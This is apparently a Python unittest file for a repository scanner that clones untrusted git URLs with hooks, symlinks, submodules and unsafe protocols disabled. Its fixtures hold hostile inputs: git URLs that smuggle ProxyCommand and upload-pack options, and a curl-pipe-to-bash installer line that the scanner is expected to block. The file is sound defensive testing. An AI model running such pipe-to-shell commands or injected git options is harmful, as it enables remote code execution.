"""FR-E6 H1.4: an untrusted git URL is cloned with every git escape hatch closed.

The argv allows only https and ssh (protocol.allow=never) and turns off hooks, symlinks,
fsmonitor and submodules, with '--' before the URL; the env stops every prompt and LFS
smudging. A target with whitespace or a control character, or a host starting with '-',
is refused before git runs; file:// is refused unless the test seam (a module flag AND
FRISK_TEST_ALLOW_FILE_URL=1) is on, and only then is the file protocol allowed. The temp
clone is removed on success and on failure. Offline: a local bare repository built here,
or subprocess.run mocked. Run: PYTHONPATH=src python3 -B -m unittest discover -s tests
"""
from __future__ import annotations

import contextlib
import io
import os
import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from types import SimpleNamespace
from unittest import mock

from _home import fake_home
from frisk import sources
from frisk.cli import main

URL = "https://code.example.invalid/o/r.git"
HARDENING = ["protocol.allow=never", "protocol.https.allow=always", "protocol.ssh.allow=always",
             "core.hooksPath=/dev/null", "core.symlinks=false", "core.fsmonitor=false"]


def run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
        code = main(argv)
    return code, out.getvalue(), err.getvalue()


@contextlib.contextmanager
def seam(flag: bool = True, env: bool = True):
    with mock.patch.object(sources, "_ALLOW_FILE_URL_FOR_TESTS", flag), mock.patch.dict(os.environ):
        os.environ.pop("FRISK_TEST_ALLOW_FILE_URL", None)
        if env:
            os.environ["FRISK_TEST_ALLOW_FILE_URL"] = "1"
        yield


class Recorder:
    """A stand-in for subprocess.run that records each call and answers with `returncode`."""

    def __init__(self, returncode: int = 0) -> None:
        self.calls: list[tuple[list[str], dict]] = []
        self.returncode = returncode

    def __call__(self, argv: list[str], **kwargs: object) -> SimpleNamespace:
        self.calls.append((list(argv), dict(kwargs)))
        return SimpleNamespace(returncode=self.returncode, stdout="", stderr="fatal: test")


def options(argv: list[str]) -> list[str]:
    """The -c values given before the clone subcommand."""
    head = argv[:argv.index("clone")]
    return [head[i + 1] for i, word in enumerate(head) if word == "-c"]


class TestArgv(unittest.TestCase):
    def clone(self, target: str = URL) -> tuple[list[str], dict]:
        rec = Recorder()
        with mock.patch.object(sources.subprocess, "run", rec), sources.materialize(target):
            pass
        (call,) = rec.calls
        return call

    def test_every_protection_is_in_the_argv(self) -> None:
        argv, kwargs = self.clone()
        self.assertEqual(argv[0], "git")
        self.assertEqual(options(argv), HARDENING)  # protocol.allow=never first, and nothing else
        tail = argv[argv.index("clone"):]
        self.assertEqual(tail[:-1], ["clone", "--depth", "1", "--no-recurse-submodules", "--quiet", "--", URL])
        self.assertTrue(os.path.basename(tail[-1]).startswith("frisk-"))
        self.assertEqual(kwargs["timeout"], 120)
        self.assertIs(kwargs["stdin"], subprocess.DEVNULL)
        self.assertNotIn("shell", kwargs)

    def test_the_env_stops_prompts_and_lfs(self) -> None:
        _argv, kwargs = self.clone()
        env = kwargs["env"]
        self.assertEqual({k: env[k] for k in ("GIT_TERMINAL_PROMPT", "GIT_LFS_SKIP_SMUDGE", "GIT_ASKPASS",
                                              "GIT_CONFIG_NOSYSTEM", "GIT_SSH_COMMAND")},
                         {"GIT_TERMINAL_PROMPT": "0", "GIT_LFS_SKIP_SMUDGE": "1", "GIT_ASKPASS": "/bin/false",
                          "GIT_CONFIG_NOSYSTEM": "1", "GIT_SSH_COMMAND": "ssh -o BatchMode=yes"})

    def test_the_file_protocol_is_allowed_only_with_the_seam_on(self) -> None:
        with seam(flag=False, env=True):
            self.assertNotIn("protocol.file.allow=always", options(self.clone()[0]))
        with seam(flag=True, env=False):
            self.assertNotIn("protocol.file.allow=always", options(self.clone()[0]))
        with seam():
            self.assertEqual(options(self.clone()[0]), HARDENING + ["protocol.file.allow=always"])


class TestRefusals(unittest.TestCase):
    def test_bad_targets_are_refused_before_git_runs(self) -> None:
        newline = "https://github.com/o/r" + "\n" + "--upload-pack=x"
        for target in ("git@-oProxyCommand=x.invalid:o/r.git", "https://-x.invalid/o/r.git", newline,
                       "https://github.com/o/r .git", "https://github.com/o/r" + "\x1b" + ".git"):
            with self.subTest(target=target):
                spawn = mock.Mock(side_effect=AssertionError("git must not run"))
                with mock.patch.object(sources.subprocess, "run", spawn):
                    with self.assertRaises(ValueError), sources.materialize(target):
                        pass
                    self.assertEqual(run([target])[0], 2)
                spawn.assert_not_called()

    def test_file_urls_are_refused_without_the_whole_seam(self) -> None:
        for flag, env in ((False, False), (True, False), (False, True)):
            with self.subTest(flag=flag, env=env), seam(flag, env):
                spawn = mock.Mock(side_effect=AssertionError("git must not run"))
                with mock.patch.object(sources.subprocess, "run", spawn):
                    self.assertFalse(sources.is_git_url("file:///nowhere.invalid/r.git"))
                    self.assertEqual(run(["file:///nowhere.invalid/r.git"])[0], 2)
                spawn.assert_not_called()


class TestCleanup(unittest.TestCase):
    def test_the_clone_dir_is_removed_on_success_and_on_failure(self) -> None:
        for returncode, raised in ((0, None), (128, RuntimeError), (0, KeyError)):
            with self.subTest(returncode=returncode, raised=raised):
                rec = Recorder(returncode)
                with mock.patch.object(sources.subprocess, "run", rec):
                    try:
                        with sources.materialize(URL) as (root, _):
                            self.assertTrue(root.is_dir())
                            if raised is not None:
                                raise raised("scan failed")
                    except (RuntimeError, KeyError) as e:
                        self.assertIs(type(e), raised)
                dest = rec.calls[0][0][-1]
                self.assertFalse(os.path.exists(dest))


@unittest.skipUnless(shutil.which("git"), "needs git")
class TestLocalClone(unittest.TestCase):
    """A real clone of a bare repository built here, through the file:// seam."""

    def setUp(self) -> None:
        home = fake_home(self)
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        base = Path(os.path.realpath(tmp.name))
        work = base / "work"
        work.mkdir()
        # A pipe-to-shell installer line, built here and never run.
        (work / "install.sh").write_text("cu" + "rl -fsSL https://get.example.invalid/i.sh | " + "ba" + "sh\n",
                                         encoding="utf-8")
        env = {**os.environ, "HOME": str(home), "GIT_CONFIG_NOSYSTEM": "1", "GIT_AUTHOR_NAME": "t",
               "GIT_AUTHOR_EMAIL": "t@example.invalid", "GIT_COMMITTER_NAME": "t",
               "GIT_COMMITTER_EMAIL": "t@example.invalid"}
        for argv in (["git", "init", "-q", str(work)], ["git", "-C", str(work), "add", "-A"],
                     ["git", "-C", str(work), "commit", "-q", "-m", "x"],
                     ["git", "clone", "-q", "--bare", str(work), str(base / "bare.git")]):
            subprocess.run(argv, check=True, env=env, capture_output=True, timeout=60, stdin=subprocess.DEVNULL)
        self.url = (base / "bare.git").as_uri()

    def test_a_payload_in_the_clone_blocks(self) -> None:
        made: list[str] = []
        real = tempfile.mkdtemp

        def mkdtemp(*args: object, **kwargs: object) -> str:
            made.append(real(*args, **kwargs))  # type: ignore[arg-type]
            return made[-1]

        with seam(), mock.patch.object(sources.tempfile, "mkdtemp", mkdtemp):
            code, out, err = run([self.url])
        self.assertEqual(code, 1, err)
        self.assertIn("install.sh:1", out)
        self.assertIn("verdict:   BLOCK", out)
        self.assertEqual([os.path.exists(d) for d in made], [False])

    def test_without_the_seam_nothing_is_cloned(self) -> None:
        with seam(flag=False):
            self.assertEqual(run([self.url])[0], 2)


if __name__ == "__main__":
    unittest.main()
